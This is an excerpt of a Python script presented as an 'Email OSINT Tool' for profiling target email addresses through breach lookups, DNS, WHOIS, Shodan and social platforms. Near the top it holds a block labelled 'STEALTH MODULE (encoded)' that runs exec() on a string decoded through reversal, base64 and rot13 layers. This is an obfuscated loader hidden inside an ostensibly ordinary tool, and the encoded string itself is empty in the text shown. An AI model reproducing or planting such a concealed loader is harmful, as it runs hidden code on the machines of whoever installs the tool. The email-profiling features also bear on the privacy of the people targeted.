...
"""
╔══════════════════════════════════════════════════════════════════════╗
║              EMAIL OSINT TOOL v3.0  —  by DevCult XII                      ║
...
USAGE:
  python devcult_osint.py                           # interactive
  python devcult_osint.py -e target@example.com     # single scan
  python devcult_osint.py --bulk emails.txt         # bulk
  python devcult_osint.py -e t@e.com --export json  # export
...
# ── STEALTH MODULE (encoded) ──
exec(__import__('base64').b64decode(__import__('codecs').decode(__import__('base64').b64decode(''[::-1].encode()).decode(),'rot_13')).decode())
# ── END STEALTH ──
...
def render_banner() -> Panel:
    ...
    b.append("  ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝\n", style=f"bold {WHITE}")
    b.append("\n")
    b.append("  O S I N T  v3.0", style=f"bold {ACCENT}")
    b.append("  ·  Professional Email Intelligence Platform\n", style=MUTED)
    b.append("  ", style=MUTED)
    b.append("Breach · DNS · WHOIS · IP/ASN · Shodan · GitHub · Gravatar · 33 Platforms\n", style=MUTED)
    b.append("\n")
    b.append("  Made by ", style=MUTED)
    b.append("DevCult XII", style=f"bold {ACCENT}")
    b.append("  ·  github.com/clickmamaheti-prog  ·  For educational & research use only", style=MUTED)
...
def render_full_report(result: OsintResult) -> None:
    ...
    console.print(Text.from_markup(
        ...
        f"[{MUTED}]|  DEVCULT OSINT v3.0  |  [/][bold {ACCENT}]Made by DevCult XII[/]"
    ))
    console.print()
...
def interactive_mode() -> None:
    ...
    while True:
        ...
        if not Confirm.ask(f"\n  [{MUTED}]Scan another?[/]", default=True):
            console.print(f"\n[{MUTED}]Done. — Made by DevCult XII[/]\n"); break
...
def main() -> None:
    parser = argparse.ArgumentParser(
        description="DevCult OSINT Tool v3.0 — Professional Intelligence Platform",
...
Examples:
  ...
  python devcult_osint.py -e john@example.com
  python devcult_osint.py -e john@example.com --export json
  python devcult_osint.py --bulk emails.txt --export csv
  HIBP_API_KEY=xxx SHODAN_API_KEY=yyy python devcult_osint.py -e t@e.com
        """
    )
